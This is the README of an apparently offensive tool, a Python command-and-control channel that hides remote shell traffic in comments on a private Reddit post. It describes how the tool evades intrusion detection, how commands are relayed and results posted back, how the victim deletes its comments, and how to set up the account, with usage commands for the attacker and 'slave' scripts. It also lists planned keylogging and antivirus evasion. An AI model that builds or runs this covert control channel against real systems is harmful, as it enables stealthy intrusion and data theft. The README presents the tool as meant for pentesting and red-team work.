# Python Reddit CnC
A Python based Reddit CnC

## Why Reddit?
I wanted to create a Python based shell that would be very hard to differentiate from legitimate traffic. The first project I made was a Python HTTPS shell that would generate noise to reddit.com but this would still need a self-signed certificate which would cause IDS to trigger on the invalid certificate associated with the displayed domain (reddit.com). After brainstorming for a while and letting colleagues of mine analyze the PCAP, I remembered the Turla CnC which made use of Instagram comments, found the [PRAW](https://praw.readthedocs.io/en/latest/) library and [a Reddit comment bot](https://github.com/yashar1/reddit-comment-bot). The result of all these inspirations is shown in the scripts.

I hope that this tool will prove useful in pentesting, red team, CTF, etc.

## How it works
The attacker creates a subreddit (preferably a private one), this subreddit will serve as the place for the attacker to execute the commands and the victim to post the output of the executed command. This can be summarized as follows:
* Attacker creates a post on the subreddit and notes the ID of this post
* Attacker starts the Reddit CnC with the following parameters: username, password, client-id, client-secret, subreddit and post-id
* The CommandCenter places a "start" string and waits for the "ready" comment of the victim
* When the victim script starts it looks for the "start" string and places a "ready" comment
* The attacker parses the "ready" comment and places the "exec whoami" comment to issue a whoami command to the victim
* The victim responds with "result [user id]"
* The attacker parses the comment by verifying that the comment ID does not exists in the list with parsed comment ID's
* Result gets displayed on the terminal of the attacker

After issuing the "exit" command by the attacker, the victim will delete all the comments in the subreddit's post.

## Requirements
* [Python](https://www.python.org/downloads/)
* [PRAW](https://praw.readthedocs.io/en/latest/) - Python Reddit API Wrapper
* [DNSPython](http://www.dnspython.org/) - Python DNS toolkit
* A **Reddit** account

## Setup
### Reddit
**Setting up the Reddit account details**
* [Navigate to the Reddit Apps page ](https://www.reddit.com/prefs/apps/)
* Click *create an app*
* **name:** Set a name for your app
* **type:** Script
* **description:** Optional
* **about url:** Optional
* **redirect uri:** http://localhost:8080
* Write down the *client id* and *secret*

**Setting up the subreddit**
* [Create a subreddit](https://www.reddit.com/subreddits/create)
* **name:** Set a name for your subreddit
* **title:** Set a title for your subreddit
* **description:** Optional
* **sidebar:** Optional
* **Posttext:** Optional
* **language:** Optional
* **type:** this can be anything you want, if you want to go for stealth I suggest setting this to "private"
* **content options:** Optional
* **wiki:** Optional
* **spamfilter:** I suggest setting this to low, I have not tested if it deletes comments when issuing a lot of commands
* **other options:** Leave default
* **mobile looks:** really?
* **Press create**

* Create a first post, the content doesn't matter
* Write down the ID of the post displayed in the URL

## Usage
**Attacker**
```sh
$ python reddit_command.py --username [username] --password [password] --client-id [client ID] --client-secret [client secret] --subreddit [subreddit you created] --post-id [ID of the post in the subreddit]
```

**Victim**
```sh
$ python reddit_slave.py --username [username] --password [password] --client-id [client ID] --client-secret [client secret] --subreddit [subreddit you created] --post-id [ID of the post in the subreddit]
```

## Future improvements
* Add keylogger/clipboardlogger option
* Hide the victim script inside an executable with antivirus/endpoint protection/solution evasions

## Acknowlegdements
* Idea based on the [Reddit Comment Bot](https://github.com/yashar1/reddit-comment-bot)
